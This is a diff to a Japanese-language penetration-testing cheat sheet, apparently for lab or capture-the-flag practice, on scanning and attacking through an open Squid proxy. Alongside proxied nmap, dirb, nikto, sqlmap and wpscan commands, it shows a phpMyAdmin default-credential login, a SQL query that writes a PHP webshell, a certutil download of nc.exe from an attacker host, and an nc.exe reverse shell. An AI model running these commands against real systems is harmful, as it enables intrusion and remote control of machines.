@@ -64,19 +64,16 @@ curl --proxy http://<squid_IP>:3128 http://<TargetIP>
 ### proxychainsを使う方法
 
 `/etc/proxychains.conf`の末尾に以下を追記
-
 ```
-http <squid_ip> 3128
+http <squid_IP> 3128
 ```
 
 認証が必要な場合は末尾にユーザー名・パスワードも追記
-
 ```
-http <squid_ip> 3128 <username> <password>
+http <squid_IP> 3128 <username> <password>
 ```
 
 proxychainsからnmapを実行（`-sT`を使うこと）
-
 ```zsh
 proxychains nmap -sT -n -p- localhost
 ```
@@ -84,48 +81,43 @@ proxychains nmap -sT -n -p- localhost
 ### SPOSE Scanner（推奨）
 
 [spose.py](https://github.com/aancw/spose)を使ったSquid経由のポートスキャン
-
 ```zsh
-python3 spose.py --proxy http://<squid_ip>:3128 --target <squid_ip>
+python3 spose.py --proxy http://<squid_IP>:3128 --target <squid_IP>
 ```
 
 ## 各ツールのプロキシ対応オプション
 
 DIRB
-
 ```zsh
 # プロキシなしだと403になる場合
 dirb http://<TargetIP>/path
 
 # プロキシ経由
-dirb http://<TargetIP>/path -p <squid_ip>:3128
+dirb http://<TargetIP>/path -p <squid_IP>:3128
 ```
 
 Nikto
-
 ```zsh
 # プロキシなし
 nikto -h <TargetIP>
 
 # プロキシ経由
-nikto -h <TargetIP> -useproxy http://<squid_ip>:3128
+nikto -h <TargetIP> -useproxy http://<squid_IP>:3128
 ```
 
 sqlmap
-
 ```zsh
 # プロキシなし
 sqlmap -u "http://<TargetIP>/sqli/Less-1/?id=1" --dbs
 
 # プロキシ経由
-sqlmap -u "http://<TargetIP>/sqli/Less-1/?id=1" --dbs --proxy http://<squid_ip>:3128
+sqlmap -u "http://<TargetIP>/sqli/Less-1/?id=1" --dbs --proxy http://<squid_IP>:3128
 ```
 
 WPScan
-
 ```zsh
 # プロキシ経由
-wpscan --url http://<TargetIP>/wordpress --wp-content-dir wp-content --proxy http://<squid_ip>:3128
+wpscan --url http://<TargetIP>/wordpress --wp-content-dir wp-content --proxy http://<squid_IP>:3128
 ```
 
 ---
@@ -140,38 +132,33 @@ SPOSE等でスキャンして開いているポートを特定し、ブラウザ
 典型的な攻撃フロー：
 
 1. SPOSEで内部ポートスキャン → 例：8080が開いていることを確認
-2. FoxyProxy等でプロキシ設定（`<squid_ip>:3128`）
+2. FoxyProxy等でプロキシ設定（`<squid_IP>:3128`）
 3. ブラウザで `http://<TargetIP>:8080` にアクセス → 内部サービスが見える
 4. 内部サービス（phpMyAdmin、wamp等）を調査し、さらなる侵入経路を探す
 
 ## MySQL/phpMyAdmin経由でのRCE（Windowsの場合）
 
 内部にwamp/phpMyAdminが見つかった場合、デフォルト認証を試みる
-
 ```
 root : (空パスワード)
 ```
 
 ログイン後、MySQLクエリでWebShellを書き込む
-
 ```sql
 select '<?php system($_GET["cmd"]); ?>' into outfile 'C:/wamp/www/shell.php';
 ```
 
 WebShell確認
-
-```
+```powershell
 http://<TargetIP>:8080/shell.php?cmd=whoami
 ```
 
 リバースシェル取得（certutilでnc.exeをダウンロード）
-
+```powershell
+certutil -urlcache -f http://<attacker_IP>:8000/nc.exe nc.exe
 ```
-certutil -urlcache -f http://<attacker_ip>:8000/nc.exe nc.exe
-```
-
-```
-nc.exe <attacker_ip> 443 -e cmd.exe
+```powershell
+nc.exe <attacker_IP> 443 -e cmd.exe
 ```
 
 ---
@@ -181,8 +168,7 @@ nc.exe <attacker_ip> 443 -e cmd.exe
 設定ファイルパス: `/etc/squid3/squid.conf`
 
 主要なディレクティブ
-
-```
+```sh
 # リスニングポート
 http_port 3128
 
@@ -196,4 +182,4 @@ forwarded_for on    # クライアントIPをX-Forwarded-Forに付与
 ```
 
 `forwarded_for off`が設定されている場合、プロキシ越しでもクライアントIPが漏洩しない。  
-`forwarded_for on`が設定されている場合は`X-Forwarded-For: <client_ip>`がリクエストに付与される。
+`forwarded_for on`が設定されている場合は`X-Forwarded-For: <client_IP>`がリクエストに付与される。
